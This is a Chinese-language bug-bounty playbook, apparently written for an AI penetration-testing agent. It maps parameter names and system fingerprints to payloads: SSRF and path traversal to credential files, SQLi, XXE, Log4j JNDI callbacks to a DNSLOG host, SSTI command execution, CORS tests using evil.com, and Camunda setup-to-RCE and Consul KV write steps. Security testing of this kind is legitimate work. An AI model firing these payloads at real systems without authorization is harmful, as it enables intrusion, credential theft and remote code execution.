# 反射准则(Reflexes)— 按需参考手册

> **定位**:本文件从"进场必读"降级为**按需参考**。
>
> **何时 Read 本文件**:
> - 攻击中发现已知系统指纹(Camunda/.NET swagger/Consul/FineReport 等)→ Read 对应段落获取必做清单
> - 攻击中看到参数名命中(url/path/file/sort 等)→ Read 第一层获取 payload 提示与默认命令
> - 覆盖审计阶段标注 `✗` 需要补测 → Read 对应段落获取深入方法
> - **不知道用啥工具/MCP 时 → 直接看本文件末尾「工具命令映射索引」**
>
> **何时不读**:攻击阶段自由探测时。不要提前加载全文——用 AI 自身知识打,碰到需要时再查。
>
> **教训出处**:acme-uos(参数级,2025-12-XX)+ internal-10.0.0.1 8038(系统指纹级,2026-06-18)。

---

## 第一层:参数级反射(参数名 → 立刻怼 → 用什么打)

**看到 `Required parameter 'X'` 错误 / 接口接受参数 X 时,X 的语义决定下一步**:

| X 是什么 | 立刻怼 | 5 秒快速 payload | 默认命令 / MCP |
|---|---|---|---|
| `url / link / target / dest / next / redirect / callback / proxy` | **SSRF + 任意 URL 读**(高奖) | `file:///etc/passwd` `http://a/../../../etc/passwd` `http://127.0.0.1/` `http://169.254.169.254/latest/meta-data/` `gopher://127.0.0.1:6379/_` | `bash tools/run.sh ssrf-probe <target> "<full_url>"` |
| `path / file / dir / src / image / template / lang` | **任意文件读取**(高奖) | `../../../etc/passwd` `../../../proc/self/environ` `../../../proc/self/cmdline` `file:///etc/passwd` | `bash tools/run.sh ssrf-probe <target> "<full_url>"`（兼容 file:// 与路径穿越） |
| `id / uid / orderId / userId / no` | IDOR | 替换为其他用户 ID,至少测 3-5 个 | 直接替换 id 参数发 3-5 包 |
| `query / keyword / sort / orderBy` | SQLi / NoSQLi(排序参数是低估的注入点) | `' OR '1'='1` `1 AND 1=2` `sort=name,(SELECT 1)` | 手工 5 payload → 命中后 `bash tools/run.sh scanner-dispatch sqlmap <target_dir> <url_or_host> --confirm` |
| `xml / data / payload` | XXE / XML 反序列化 | `<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` | 手工 payload → DNSLOG 回连后请示重武器 |
| `expression / expr / evaluate / validate-expression / check / rule / condition` | **表达式注入 → RCE / 任意文件读 / SSRF**(高奖) | `1==1` `1+1` `new java.util.Date().getTime()>0` `new Scanner(ProcessBuilder("echo","MARKER")...).contains("MARKER")` | 四步递进: `memory/playbooks/playbook-expression-injection-progression.md`（ACM-F-001 实证 38 资产 RCE） |
| `username / account / phone / mobile` | 用户名枚举 / 撞库门 / 认证绕过 | 见下方认证绕过 8 大头 | 默认凭据单次试 + 认证绕过 8 大头（本节表格） |

**铁律**:

- **看到 url 类参数 → 5 个 SSRF payload 必须先怼**(成本 5 秒),**再去**研究密码学。
  教训复盘:示例甲方 uos — 别人看到 `/addon/parse` 要 `url=` 参数,2 包内喂 `http://a/../../../../proc/self/environ` 拿到 root 环境变量 + DB 凭据。我看到 `/v0/auth/rnd-code` 200 跑去研究密码盐弱熵,挖了 85 包出垃圾洞。**反射偏见(看 url= 参数没怼 SSRF)= 高赏金洞从眼前溜走**。
- **不要因为"看起来是密码学问题就走密码学路径"** — 90% 的高赏金洞在参数语义错配,不在算法弱熵。

### Log4j 强制触发(Java 技术栈零漏测) ⭐ OPAC P0 漏测修复

> **铁律:Java 技术栈(Tomcat/Spring/Axis2/WebLogic/JBoss/WildFly) + 任何用户输入点 → Log4j 必须在 Top 3 投入。**
> 教训:10.0.0.4 金盘 OPAC 是 Java+Tomcat+搜索接口,0 包投 Log4j = P0 漏测。

| 触发条件 | 必投 payload | 投入点 | 默认命令 |
|---|---|---|---|
| Java 技术栈 + 搜索/查询接口 | `${jndi:ldap://X.DNSLOG/a}` → GET/POST 参数值 | keyword/query/search/name | 手工单点投 → 批量验证用 `bash tools/run.sh scanner-dispatch nuclei <target_dir> <url_or_host> --tags cve,log4j` |
| Java 技术栈 + 登录/认证接口 | `${jndi:ldap://X.DNSLOG/a}` → username/password | 登录表单/JSON body | 手工单点投 |
| Java 技术栈 + 错误回显 | `${jndi:ldap://X.DNSLOG/a}` → 触发异常的参数 | 404路径/异常参数/UA Header | 手工单点投 |
| Java 技术栈 + HTTP Header | `${jndi:ldap://X.DNSLOG/a}` → X-Forwarded-For/UA/Referer | 任何可被日志记录的 Header | 手工单点投 |

**验证**:DNSLOG 收到请求 = Log4j RCE 坐实。**不发 DNSLOG 请求 ≠ 安全**,可能被 WAF/出站规则拦截 — 需要结合 HTTP 回显/延迟判断。

**关联**:此规则与第二层"组合指纹触发器"互为补充 — 参数级(本段)是"看到 Java 立刻想到 Log4j",系统级是"Java+用户输入组合必测清单"。

### 认证绕过 8 大头(看到 401/403 必试)

| 维度 | 绕过技术 | 示例 |
|---|---|---|
| **路径** | 尾斜杠/大小写/路径穿越/分号截断/版本枚举 | `/admin` → `/admin/` `/Admin` `/admin..;/` `/api/v1/admin` → `/api/v2/admin` |
| **Header** | 反代信任头/IP 伪装 | `X-Original-URL: /admin` `X-Forwarded-For: 127.0.0.1` `X-Real-IP: 127.0.0.1` |
| **方法** | 动词切换/方法重写头 | GET 403 → POST/TRACE/OPTIONS 试 / `X-HTTP-Method-Override: GET` |
| **JWT** | alg:none / 算法降级 / kid 注入 / 弱密钥 | Header 改 `{"alg":"none"}` / RS256→HS256 用公钥当 HMAC 密钥 |
| **OAuth** | redirect_uri 校验弱 / state 缺失 / code 重放 | `https://target.com.attacker.com` / CSRF 接管 |
| **路径遍历变形** | 空白字符/双斜杠/当前目录 | `/admin%20` `/admin%09` `//admin` `/./admin` |
| **版本降级** | API 版本 v2→v1 权限校验弱 | `/api/v2/admin` 403 → `/api/v1/admin` 200 |
| **IP 来源伪装** | 多个 IP 头组合 | `X-Client-IP` `X-Originating-IP` `X-Remote-Addr` `True-Client-IP` |

**验证标准**:200 + Body 含真实内部数据(用户列表/配置/管理功能),不是登录页 HTML 或 fallback 页面。

**认证面不止绕过 8 头** — 有注册/重置/邀请/MFA/IdP 时走状态机(type 分发 + 未授权写 + exist/noexist + Feature≠API):  
[`memory/playbooks/playbook-auth-state-machine-resolve-style.md`](../memory/playbooks/playbook-auth-state-machine-resolve-style.md)。  
死路分类 A/B/C: [`memory/insights/dead-end-taxonomy.md`](../memory/insights/dead-end-taxonomy.md)。

### ⚠️ 反向偏见(2026-06-17 luxline 学费)

看到关键字命中 SPA bundle 时,**必须 grep 上下 80 字符确认是业务参数,不是库 metadata**。常见库 metadata 排除:

- `axios` 库的 `"repository":{"url"}` / `"bugs":{"url"}`
- `bundlesize` / webpack / rollup 配置(`"path":"./dist/..."`)
- React/Vue 内部 DOM type switch(`case "img": case "image": case "link":`)
- 库的 `defaults.url` / 默认配置

**真业务参数在**:`axios.{get,post}(URL, ...)` 调用 / 业务代码 query 拼接 / `{url: <var>}` config 对象 / 后端响应字段名暴露的 API 设计。

→ `memory/rejected/spa-reflection-keywords-in-library-metadata.md` ★

---

## 第二层:系统指纹反射(端口/服务 → 必做最小覆盖清单)

**看到下表系统指纹时,即使没找到注入,也必须完成清单内全部步骤才能撤档。**

每条指纹后的清单是**最小集**,不是穷举 — 走完这些步骤还无洞才允许标"已撤档"。

### 组合指纹触发器(技术栈 × 用户输入 → 必测漏洞类) ⭐ OPAC 教训源

> **教训**:10.0.0.4 识别了 Java+Tomcat+搜索接口,但 0 包投 Log4j → P0 漏测。
> **根因**:技术栈识别与漏洞检测之间缺少**自动示例甲方**。看到 Java 没想到 Log4j。
> **修复**:下表是**组合指纹命中后的必测清单**,不走完不许撤档。

| 组合指纹 | 必测漏洞 | 投入点 | 5 秒快速 payload | 默认工具链 |
|---|---|---|---|---|
| **Java + 任何用户输入**(Tomcat/Spring/WebLogic/Axis2/JBoss) | **Log4j + Fastjson + Shiro** | 搜索/登录/评论/回显/错误页/UA/任何反射点 | `${jndi:ldap://DNSLOG}` / Fastjson `{"@type":"java.net.Inet4Address","val":"DNSLOG"}` / Shiro `rememberMe=xxx` 检测 | 手工单点投 → `skills/injection/deserialization-rce.md` 版本→gadget 速查 → `bash tools/run.sh scanner-dispatch nuclei <target_dir> <url_or_host> --tags cve,spring` |
| **.NET + API + JWT** | **alg:none + [Authorize]类级漏配** | 任意 JWT 端点 | 改 `{"alg":"none"}` / 无 Token 访问 swagger 声明 Bearer 的端点 | `mcp__js-reverse-mcp__new_page <url>` → 读 swagger.json → 测 CORS + `[Authorize]` 漏配 |
| **PHP + 文件操作** | **文件包含 + phar反序列化** | upload/file/path/lang 参数 | `php://filter/convert.base64-encode/resource=index` / phar:// 反序列化 | `bash tools/run.sh ssrf-probe` + `bash tools/run.sh scanner-dispatch nuclei <target_dir> <url_or_host> --tags php` |
| **Node + Express + MongoDB** | **NoSQL注入 + 原型污染** | login/search/query 参数 | `{"$gt":""}` / `{"__proto__":{"admin":true}}` | 手工 payload → `bash tools/run.sh scanner-dispatch nuclei <target_dir> <url_or_host> --tags nosql` |
| **Spring Boot + Actuator** | **env凭据 + heapdump + jolokia + prometheus uri泄露** | /actuator 路径 | `/actuator/env` / `/actuator/heapdump` / `/actuator/jolokia`；**裁剪只留 prometheus 时 → 全量指标 uri 标签 = 活路由表（业务端点精确泄露，ACM-F-001 实证）** | `curl` 直探 → 命中后 `bash tools/run.sh scanner-dispatch nuclei <target_dir> <url_or_host> --tags actuator` |
| **Python + Flask/Django + 模板** | **SSTI + debug模式** | 搜索/用户名/任何回显 | `{{7*7}}` / `{{config}}` / `__import__('os').popen('id').read()` | 手工 payload → `bash tools/run.sh scanner-dispatch nuclei <target_dir> <url_or_host> --tags ssti` |
| **Go + Gin + ORM** | **SQLi(ORM绕过) + SSRF** | query/sort/where/url 参数 | Raw query 注入 / `file:///etc/passwd` | `bash tools/run.sh ssrf-probe` + 手工 SQLi → `bash tools/run.sh scanner-dispatch sqlmap <target_dir> <url_or_host> --confirm` |

**铁律**:
- **Java 技术栈 + 任何用户输入 → Log4j 必须在 Top 3 投入**,不是"可选项"
- 组合指纹命中时,表中**全部必测项走完**才能标"已撤档"
- 这不是穷举,是最小覆盖 — 如果组合指纹表没有你的场景,回到单指纹反射或决策树

### .NET Kestrel + swagger 公开 ⭐ 8038 教训源

| 步骤 | 操作 | 信号 | 包数 |
|---|---|---|---|
| 1 | OPTIONS preflight,Origin 用 5 个不同测试值(`evil.com` / `null` / `a.b.c.d.evil.com` / `空` / `IP.attacker.com`) | 反射 + `Allow-Credentials: true` = **CORS 漏洞坐实** | 1 |
| 2 | swagger.json 顶级 `security:[{Bearer:[]}]` 声明 vs 任意 Authorization 实测响应 | 声明 Bearer JWT 但任意请求 200 = `[Authorize]` 漏配 | 2-3 |
| 3 | 异常 body 触发 ProblemDetails(`NOT_A_JSON{{{` / 类型错误 / 完全错误 JSON) | 暴露 `traceId` / 内部字段名(swagger 未声明) = 信息泄露 | 1 |
| 4 | 50+ 隐藏 endpoint 枚举(`health`, `api/values`, `Identity/Account/Login`, `admin`, `_framework/blazor.boot.json`, `WeatherForecast`, `Diagnostics`...) | 找未声明 controller / 调试面 | 1-2 |

**总成本 ≤ 8 包,3 类洞概率覆盖率 70%+**。
错过任一步 = 重演 acme / 8038 教训。

.NET swagger 系统指纹的完整必做清单见上。注:8038 实战结论是**空壳**(host 路由错配,无真实业务),教训档见 `memory/rejected/dotnet-kestrel-host-routing-empty-shell.md` —— "指纹命中 ≠ 有洞,必做清单走完才能判定空壳并撤档"。

**工具链**: `mcp__js-reverse-mcp__new_page <url>` → 读 `swagger.json` → 测 CORS + `[Authorize]` 漏配 → `bash tools/run.sh scanner-dispatch nuclei <target_dir> <url_or_host> --tags dotnet`。

### Java + 任意 setup 路径 ⭐ Camunda 教训源

| 步骤 | 操作 | 信号 |
|---|---|---|
| 1 | 扫 `/camunda/* /bpm/* /workflow/* /h2/* /admin/setup` 5 类常见前缀 | HTTP 200 + setup HTML/wizard |
| 2 | GET version 端点(`/engine-rest/version` / `/h2/?...`)看产品版本 | 7.x / 1.x 等存活版本 |
| 3 | 跟 setup REST 链(GET 拿 cookie/XSRF → POST 创建首个 admin) | 204 = 无凭据创建管理员成功 |
| 4 | Basic Auth 部署 BPMN(scriptTask + Nashorn JS / Groovy Runtime.exec) | history variable 取回 root 命令输出 |

**总成本 8 包,Critical RCE 命中率高**。

完整 playbook: `memory/playbooks/playbook-camunda-setup-unconfigured-rce.md` ✅

**工具链**: `bash tools/run.sh recon-pipeline <target_dir> <domain>` 扫 setup 路径 → 命中后用 `mcp__js-reverse-mcp__new_page` 跟 setup REST 链 → 部署 BPMN 用 `bash tools/run.sh scanner-dispatch nuclei <target_dir> <url_or_host> --tags camunda`。

### HashiCorp Consul / etcd / Nacos 注册中心

| 步骤 | 操作 | 信号 |
|---|---|---|
| 1 | `/v1/agent/self` 看 `ACLsEnabled` | `false` = ACL 关闭,继续步骤 2 |
| 2 | `/v1/kv/?keys&recurse` KV 全枚举 | 空 → 不要硬磕,直接步骤 3 |
| 3 | `/v1/health/state/any` 拿 8+ 内部服务真实 hostname:port | 等于免费拓扑图 |
| 4 | KV 写 + 服务注册测试(立即清理) | 200 = 完全失守 |

**总成本 4 包**。
教训:**KV 空 ≠ Consul 没价值** — `memory/rejected/consul-kv-empty-but-services-rich.md` ✅

**工具链**: `curl -s http://<host>:8500/v1/agent/self` → `bash tools/run.sh scanner-dispatch nuclei <target_dir> <url_or_host> --tags consul,etcd,nacos`。KV 写/服务注册测试后**立即清理**。

### Kafka / RabbitMQ Web UI

| 步骤 | 操作 | 信号 |
|---|---|---|
| 1 | `/api/clusters/local/topics` / RabbitMQ `/api/overview` | 列出 topic / queue 含数据量 |
| 2 | 默认凭据(guest/guest, admin/admin)+ 厂商弱密码 | 401 → 200 切换看是否有 |
| 3 | 拉真实业务消息样本(GET only) | 评估业务影响 + 配合内部 broker 直连 |

**工具链**: `curl` 直探管理 API → 默认凭据试一次 → `bash tools/run.sh scanner-dispatch nuclei <target_dir> <url_or_host> --tags kafka,rabbitmq`。

### 帆软 FineReport / FineBI 决策系统 ⭐ 10.0.0.2 教训源

| 步骤 | 操作 | 信号 | 包数 |
|---|---|---|---|
| 1 | **第一时间抓 `/file?path=/com/fr/web/resources/dist/bundle.min.js&type=plain&parser=dynamic`** — grep 出全部 API 路径(`"/v10/..."`) | 一次性获取完整攻击面(3MB bundle 含全量路由) | 1 |
| 2 | `/system/info` + `/login/config`(无认证) | RSA 公钥 + LDAP 属性 + 认证策略泄露 | 2 |
| 3 | `/login/cross/domain` POST JSON `{"username":"admin","password":"admin"}` | 暴破入口 + callback JSONP 注入(body 中 callback 字段) | 1 |
| 4 | 所有路径加 `X-Requested-With: XMLHttpRequest` header 重试 | CAS filter bypass — CAS 只拦非 AJAX 请求 | 1 |
| 5 | `/view/duchamp?viewlet=<模板>.fvs` + XHR + token | FVS 大屏越权(渲染层不做二次鉴权) | 2 |
| 6 | `/view/duchamp/resource/preview?tplPath=<valid>&resource=../` | 触发堆栈泄露(Special char prohibit + 100 行 stack trace) | 1 |
| 7 | 端口 38888 TCP 连接 | 帆软远程设计二进制协议(400 Bad Request = 存活) | 1 |

**总成本 ≤ 10 包，帆软系统关键覆盖**。

**铁律**:
- 帆软的 bundle.min.js 是**第一信息源**（包含全量 API 路由 + 参数格式）— 不要盲猜路径
- CAS 整合的帆软：XHR header 绕过 CAS → 帆软内部用 errorCode 区分(21300014=未认证, 21300004=无权限)
- 帆软 fine_auth_token JWT：主页面渲染时刷新，但 REST API 可能需要有效 CAS session 先建 session
- FVS 大屏（/view/duchamp）渲染层权限独立于 REST API 权限 — 低权限用户可能看到所有模板

教训复盘：20 包盲猜 API 路径 + 反复试 cookie 组合 = 未先抓 bundle 提取全貌 + 不了解帆软 CAS 认证架构

**工具链**: `mcp__js-reverse-mcp__new_page <url>` 抓 bundle.min.js → `bash tools/run.sh js-recon <target> <url>` 提取 API → 详细 playbook: `memory/playbooks/playbook-finereport-cas-auth-architecture.md`。

### Spring Boot Actuator 公开

| 步骤 | 操作 | 信号 |
|---|---|---|
| 1 | `/actuator` 列已开放 endpoint | 看 env / heapdump / loggers / jolokia |
| 2 | `/actuator/env` 找凭据(spring.datasource / encrypt.key) | 凭据明文返回 |
| 3 | `/actuator/jolokia` 反序列化 / `/actuator/loggers` POST | 部分版本可 RCE |
| 4 | `/actuator/heapdump` 拉 内存 dump 反取 token / session | 大文件下载 |
| 5 | **裁剪只剩 prometheus → 拉全量指标** | **`http_server_requests_*` metric 的 `uri` 标签 = 活路由表，业务端点精确泄露（含被认证墙挡住不可 fuzz 的路径）**；`application`/`region` 标签泄露服务名，hystrix `key` 泄露路由 key。ACM-F-001 实证：由 prometheus uri 泄露 `/strategy/validate-expression` → 匿名表达式注入 RCE 38 资产（`targets/acme/smartapp.mbgstore.acme.com.cn/findings.md`） |

**工具链**: `curl` 直探 `/actuator/env` / `/actuator/heapdump` → 命中敏感信息后 `bash tools/run.sh scanner-dispatch nuclei <target_dir> <url_or_host> --tags actuator,spring`。

### MQTT broker 1883 / 8883

| 步骤 | 操作 | 信号 |
|---|---|---|
| 1 | 匿名订阅 `#` 通配符(`mosquitto_sub -h <host> -t '#'`) | 收到任意 topic 消息 = 完全开放 |
| 2 | retained message 保留消息 dump | 可能含敏感配置 |
| 3 | 默认凭据(`admin/public`, `guest`/空)+ ACL bypass | 弱配置常见 |

**工具链**: `mosquitto_sub -h <host> -t '#'`（需本地安装 mosquitto 客户端） → `bash tools/run.sh scanner-dispatch nuclei <target_dir> <url_or_host> --tags mqtt`。

### 微信小程序 wxapkg ⭐

| 步骤 | 操作 | 信号 | 包数 |
|---|---|---|---|
| 1 | 反编译 wxapkg → grep API baseURL + appKey + secret | 硬编码密钥/地址 | 0（离线） |
| 2 | app.json 提取全部路由 → 对应 API 接口枚举 | 未授权接口 | 10-20 |
| 3 | 签名逻辑定位（utils/request.js）→ 破解后去签名重放 | 签名可绕过 | 5 |
| 4 | openid/unionid 替换测试 | 水平越权 | 3-5 |

**总成本 ≤ 30 包 + 离线分析,小程序 API 越权命中率高**。
详细 playbook: `skills/mobile/miniprogram.md`

**工具链**: 本地 wxapkg 反编译工具 / `mcp__js-reverse-mcp__search_in_sources` 分析反编译产物 → API 层走 `bash tools/run.sh recon-pipeline <target> <domain>` 枚举未授权接口。

### Android APK（SSL Pinning + 组件暴露）⭐

| 步骤 | 操作 | 信号 | 包数 |
|---|---|---|---|
| 1 | jadx 反编译 → grep hardcoded secrets（API_KEY/SECRET/password） | 硬编码凭据 | 0 |
| 2 | AndroidManifest.xml → exported Activity/Provider/Receiver | 组件可直接调用（绕登录） | 0 |
| 3 | Frida/Objection 绕 SSL Pinning → Burp 抓包 | 拿到全部 API 流量 | 0 |
| 4 | SharedPreferences/SQLite → 本地存储检查 | 明文 token/密码 | 0 |
| 5 | API 层走 coverage-audit 全流程 | 同 Web | N |

**总成本 = 0 包离线 + N 包 API 测试,静态分析 ROI 极高**。
详细 playbook: `skills/mobile/android.md`

**工具链**: `mcp__jadx-mcp__get_android_manifest` / `mcp__jadx-mcp__get_class_source <class>` 解包分析 → `mcp__frida-mcp__*` 绕 SSL Pinning → API 层走 coverage-audit 流程。

### Electron 桌面应用 ⭐

| 步骤 | 操作 | 信号 | 包数 |
|---|---|---|---|
| 1 | `npx asar extract resources/app.asar ./src` | 得到完整 Node.js 源码 | 0 |
| 2 | grep API_KEY / secret / baseURL / password | 硬编码凭据 | 0 |
| 3 | 检查 `webPreferences.nodeIntegration` | `true` = XSS 即 RCE | 0 |
| 4 | 检查自动更新 URL（HTTP?）+ 签名验证（有?） | 无签名 = 全用户 RCE | 1 |

**总成本 ≤ 1 包,Electron 硬编码 + nodeIntegration 命中率高**。
详细 playbook: `skills/mobile/desktop-client.md`

**工具链**: `npx asar extract resources/app.asar ./src` → 本地 grep 硬编码密钥 → 检查 `webPreferences.nodeIntegration`。

---

## 常见链式模板（启发，非反射）

> **何时看**：发现 candidate/phenomenon 后，问"能接上哪条链？"。这是链式思维前置的参考，不是"看到X立刻做Y"的反射。
> 链式是**前置攻击假设**，不是后置报告整理——看到一个 SSRF 候选时，同一时刻就在想"SSRF→169.254→凭据→actuator"。

```
SSRF + 云元数据 → 凭据 → 内网 actuator/env → heapdump → token
任意文件读 → 配置文件 → DB凭据/密钥 → 二次利用（连库/签名绕过）
信息泄露(sourcemap) → 源码 → 代码审计 → 注入点/硬编码密钥
IDOR + 批量接口 → 批量数据 → PII影响
认证绕过 + admin面板 → 配置修改 → 持久化
Log4j/JNDI → DNSLOG确认 → 内网探测 → 凭据/配置
swagger未授权 → 接口枚举 → 找未鉴权写接口 → IDOR/越权
```

**铁律**：phenomenon 之间组合可能升 verified（见 `CLAUDE.md` 铁律·组合验证）。不要因为单个 phenomenon 升不了 verified 就放弃——登记到 `_STATE.md` 深挖焦点&假设链段，等组合证据。

> **想深入操作**：以上是 1 行启发。每条链的分步操作手册（前置条件→步骤→失败 pivot→危害证明→法律边界→实战案例）见 [`skills/chain-playbook.md`](../skills/chain-playbook.md)。

---

## 关键判断:何时这一层失败,降级到决策树

只有当下面**两条同时**成立时,才算"反射准则没命中":

1. 当前接口 / 端口的指纹**不在以上两层任何一条表里**
2. 已经发起至少一次主动探测(GET 根路径 + 看响应头 / banner / favicon hash)

满足才看 `QUICK.md` 决策树或更宽泛的"高 ROI 通用打法"。
**接口 / 端口指纹一旦命中表中任何一条,清单不走完不许撤档** — 这是反射准则的核心铁律。

---

## 工具命令映射索引

> **解决"看到指纹不知道让 AI 用啥工具"的问题。**
> 与第一层、第二层配套使用:先按参数/指纹命中本文件前半部分,再在这里找默认命令。

### 拐点工具速查

| 卡壳场景 | 先用这个 | 次选 |
|---|---|---|
| 接口加密/签名阻断 | `mcp__js-reverse-mcp__new_page <url>` + `break_on_xhr` | `skills/js-reverse/crypto-sign.md` |
| JS bundle 太大找 API | `bash tools/run.sh js-recon <target> <url>` | `mcp__js-reverse-mcp__search_in_sources` |
| 0 verified 不知如何下手 | 按 4 阶段流程（`skills/orchestrator.md`）从 recon 推进 | `bash tools/run.sh recon-pipeline <target> <domain>` |
| 多子域大厂 SRC | `bash tools/run.sh space-recon <target> <domain>` | `bash tools/run.sh recon-pipeline <target> <domain>` |
| WAF 拦截所有 payload | 转测 IDOR / 业务逻辑 / 前端配置泄露 | `memory/playbooks/playbook-frontend-config-js-attack-surface.md` |
| 有登录但 path 矩阵无洞 | Auth 状态机 playbook(注册/重置/邀请/MFA) | `memory/playbooks/playbook-auth-state-machine-resolve-style.md` |
| Dead End 不知能否重开 | DE 三分类 A/B/C + reopen_if | `memory/insights/dead-end-taxonomy.md` |
| 需要重武器（Nuclei/sqlmap/nmap） | `bash tools/run.sh scanner-dispatch <tool> <target_dir> <url_or_host>` | 请示用户 |
| 死磕 30 分钟无进展 | 重读本文件 + `QUICK.md` 拐点 | 换攻击面 |

### 命令速查卡

```bash
# run.sh 命令（ssrf-probe / js-recon / space-recon / scanner-dispatch / findings-lint）完整表见 CLAUDE.md §7
bash tools/run.sh ssrf-probe <target_dir> "<full_url>"   # __PAYLOAD__ 占位，自动投 18 标准 payload

# MCP 浏览器逆向
mcp__js-reverse-mcp__new_page <url>
mcp__js-reverse-mcp__break_on_xhr <url-pattern>
mcp__js-reverse-mcp__search_in_sources <keyword>

# MCP 搜索（本地 memory/全目录）
mcp__everything-mcp__everything_search <keyword>

# Android 设备控制
mcp__scrcpy-mcp__screenshot
mcp__scrcpy-mcp__ui_dump
```

### 何时不用/必须用浏览器 MCP

**不用浏览器 MCP**:
- 主页 HTML 已含全部 API 路径 → 直接 `curl` + `bash tools/run.sh js-recon`
- 接口无加密无签名 → 直接 `curl`
- 仅探 sourcemap → 4-6 包 `curl` 离线搞定

**必须用浏览器 MCP**:
- 接口被 webpack 拼接 `e.baseURL + "/" + e.path`
- 加密/签名算法非显式 string match
- SignalR / WebSocket / SSE
- 二开自研鉴权头动态指定
- 业务流跨多个 XHR

---

## 第三层:思维链留底反射(BitWarden 风格双轨,2026-06-19 加)

> **教训出处**:struts-198.51.100.1 F-005 DecisionFilter — 30+ 字典探针推翻假设过程**只在 _STATE 一行字**,新会话 resume 看不到推理路径。
>
> **本反射不是"什么时候打" — 是"什么时候必须留底"**。

### 触发条件(任一即必写 investigations)

| 触发 | 必写 | 原因 |
|---|---|---|
| **推翻已升级 finding**(从 verified/candidate 降到 rejected) | `investigations/<task>/假设X-推翻.md` | 推翻路径丢失 = 后续重新犯同类错 |
| **多假设互斥并行**(2+ 假设同时探,需要 fan-out 验证) | 每假设独立 `假设A.md` / `假设B.md` | 推翻一个不污染另一个 |
| **多 agent fan-out**(recon 后 N 个 pentest-agent 各打子域) | 每 agent 一份 `investigations/agent-N/` | Commander 复盘看得到中间推理 |
| **大版本推翻**(playbook 命中后整套件被部署变种修了) | `investigations/<task>/部署变种笔记.md` | 写回 playbook v2 章节的素材 |

### 不必写(避免形式主义)

- ✗ 每个 verified finding 都要 investigation(投资回报极低)
- ✗ 单假设直接命中(直接写 finding 即可,无推翻过程不必留底)
- ✗ playbook 套模板继承的 finding(已有 inheritance 标记 = 路径自描述)

### 文件结构与契约

详见 `targets/_template/investigations/README.md`。

**核心**:
- 任务.md 起始 frontmatter / 假设清单
- 假设X-*.md 独立验证(实测证据 + 推论)
- 结论.md 回链 findings.md F-XXX + 提示 playbook 升级

---

## 关联 skills(2026-06-19 加 · BitWarden INDEX 启发)

> **元铁律**:反射准则触发时,**先开链接的 skill / playbook**,再开打。
> 不许"看到指纹想当然怼"— 链接的 skill 里写的是已 verified 的步骤清单,**它的优先级 = 反射本身**。
> **默认工具 / MCP 命令参见本文件「工具命令映射索引」**,再决定用 curl/MCP/scanner-dispatch 中的哪一种。

| 反射触发 | 必先看 skill / playbook |
|---|---|
| url/path/file 类参数 | `skills/api-logic/ssrf-arbitrary-file.md` |
| 目标特征 → 漏洞类映射（fuzz/认证后/JS分析/注入/云/上传/业务/缓存/接管/走私/反序列化/WAF/APP/链式） | 完整 skill 表见 `QUICK.md` skill 速查 + `CLAUDE.md` §3 阶段 3 |
| 系统指纹命中(.NET swagger / Camunda / Consul / Kafka / Spring Actuator / MQTT) | 对应 playbook(本文件每条已链) |
| JS 逆向场景 | `skills/js-reverse/js-deep-analysis.md` / `crypto-sign.md` |
| 多子域 / 大厂 SRC | `skills/orchestrator.md` 多代理编排段 |
| 写报告前自审 | `memory/playbooks/playbook-trash-finding-checklist-before-report.md` |
| 接单 / 进场 / 拐点 | `memory/insights/weapon-stack-three-checkpoints.md` |
| candidate→verified 证伪 | `memory/insights/falsification-protocol.md`（第4问证伪对抗自评塌缩） |
| **误测/漏测反查** | `memory/reflections/`（跨任务实战反思，防重蹈覆辙） |
| **推翻假设 / 多假设并行 / fan-out** | `targets/<>/investigations/` README + 本第三层反射 |

**违反检测**:后续若发现 playbook 命中后 finding 无 `inherited_from` 标记、或推翻路径无 investigation 留底,则回灌到 `memory/insights/playbook-reuse-subsystem.md` 或对应 rejected 档修正。

---

## 反射准则的更新机制

发现一类新指纹值得加入(满足 `memory/INDEX.md` "该写进 memory" 准入标准的第 4 条:AI 大概率想不到的"组合诱因")时:

1. 在 `memory/playbooks/` 写 playbook 文件(完整 PoC 链)
2. 在本文件对应大类下加表格行,链接 playbook
3. 手动更新 `memory/INDEX.md` 追加新条目

**不要在本文件写完整 PoC** — 这里只是 5 秒查表索引,详情链接到 playbook。

---

## 关联

- [[weapon-stack-three-checkpoints]] — 武器三道关口
- [[playbook-trash-finding-checklist-before-report]] — 垃圾洞清单
- [[playbook-frontend-config-js-attack-surface]] — 前端 config.js 攻击面
- [[playbook-auth-state-machine-resolve-style]] — Auth 状态机（resolve 式）
- [[dead-end-taxonomy]] — Dead End A/B/C
